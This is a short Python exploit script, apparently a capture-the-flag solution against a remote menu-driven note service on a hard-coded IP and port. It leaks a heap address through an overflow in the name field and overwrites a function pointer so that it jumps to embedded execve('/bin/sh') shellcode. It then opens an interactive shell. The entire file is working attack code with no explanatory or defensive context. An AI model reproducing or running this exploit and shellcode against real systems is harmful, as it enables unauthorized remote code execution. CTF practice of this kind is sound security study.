from pwnpwnpwn import *

#host = "10.211.55.16"
host = "217.218.48.87"
port = 33003

sock = make_conn(host,port)
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def create(sock,name,data):
    recvuntil(sock,"?")
    sendline(sock,"1")
    recvuntil(sock,"name:")
    sendline(sock,name)
    recvuntil(sock,"size:")
    sendline(sock,str(len(data)))
    recvuntil(sock,":")
    sendline(sock,data)

def printf(sock):
    recvuntil(sock,"?")
    sendline(sock,"4")
    raw = recvuntil(sock,"Menu")
    return raw

def edit(sock,no,name,data):
    recvuntil(sock,"?")
    sendline(sock,"2")
    recvuntil(sock,"?")
    sendline(sock,str(no))
    recvuntil(sock,"?")
    sendline(sock,"n")
    recvuntil(sock,"name:")
    sendline(sock,name)
    recvuntil(sock,":")
    sendline(sock,data)


def leakheap(sock):
    create(sock,"a",'a'*128)
    create(sock,"b",shellcode)
    edit(sock,1,'A'*124+'g','c'*128)
    raw = printf(sock)
    raw = raw.split()
    heapaddr = raw[3]
    heapaddr = heapaddr.ljust(8,"\x00")
    heapaddr = unpack(heapaddr)
    heapbase = heapaddr - 0xb0
    return heapbase

def overfunc(sock,heapbase):
    evilfunc = pack(heapbase+0x1e0)
    payload = 'k'*6
    payload += evilfunc
    edit(sock,1,'B'*126,payload)


heapbase = leakheap(sock)
print "heapbase : %016x" % heapbase
overfunc(sock,heapbase)
recvuntil(sock,"?")
sendline(sock,"4")

print "Get the shell :"
inter(sock)
